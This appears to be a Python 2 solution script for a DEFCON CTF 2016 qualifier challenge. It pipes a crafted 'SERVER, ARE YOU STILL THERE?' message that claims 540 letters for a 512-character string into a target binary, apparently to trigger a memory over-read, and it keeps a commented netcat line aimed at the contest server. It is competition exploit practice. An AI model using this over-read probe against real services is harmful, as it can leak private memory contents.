#/usr/bin/env python
##########################################################################
# imports
##########################################################################
import os
import sys
import argparse

import random
import struct
import subprocess
import fcntl

##########################################################################
# Program Globals (used for arg parsing)
##########################################################################
PROG_NAME = os.path.basename(sys.argv[0])
PROG_DESC = "DEFCON CTF 2016: BABY's FIRST 346"
PROG_VERSION = 1.0
PROG_VER_STR = "%s: Version: %s" % (PROG_NAME, PROG_VERSION)


##########################################################################
###
# main entry point
###
##########################################################################
if __name__ == '__main__':

  ######
  # setup argparse
  arg_parser = argparse.ArgumentParser( prog=PROG_NAME,
                                        description=PROG_DESC, add_help=False,
                                        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
  arg_parser.add_argument( "-?", "-h", "--help",
                           help="Displays this help message and exit",
                           action='help')
  arg_parser.add_argument('--version',
                          help="Show program's version number and exit",
                          action='version', version=PROG_VER_STR)
  arg_parser.add_argument( "-f", "--file",
                           help="full file path to execute",
                           action='store', dest="filename")

  ######
  # gotta gimme sumthin'
  if len(sys.argv) == 1:
    arg_parser.print_help()
    sys.exit(1)

  ######
  # parse args
  args = arg_parser.parse_args()

  ######
  #cmd = ["/usr/bin/ltrace", "-i", "-n 2", args.filename]
  #cmd = ["/usr/bin/gdb", "-ex", "run", args.filename]
  cmd = args.filename
  #cmd = ['nc','xkcd_be4bf26fcb93f9ab8aa193efaad31c3b.quals.shallweplayaga.me', '1354']


  ######
  msg1 = "POTATO"
  msg2 = "A"*512

  ######
  proto  = ''
  proto += "SERVER, ARE YOU STILL THERE?"
  proto += " IF SO, REPLY \"%s\" "
  proto += "(%d LETTERS)"

  ######
  proc_args  = []
  proc_args.append(("%s" % (proto)) % (msg2, 540))

  ######
  proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

  ######
  output = ''
  for x in xrange( 0, len( proc_args)):
    print "Sending: [%s]" % proc_args[x]
    proc.stdin.write( "%s\n" % proc_args[x])

    # Read from proc.stdout
    try:
      output = proc.stdout.readline().rstrip()
    except Exception, e:
      print e
      output = ''
      pass

    if len( output) > 0:
      print "output: [%s]" % output


##########################################################################
# EOF
##########################################################################
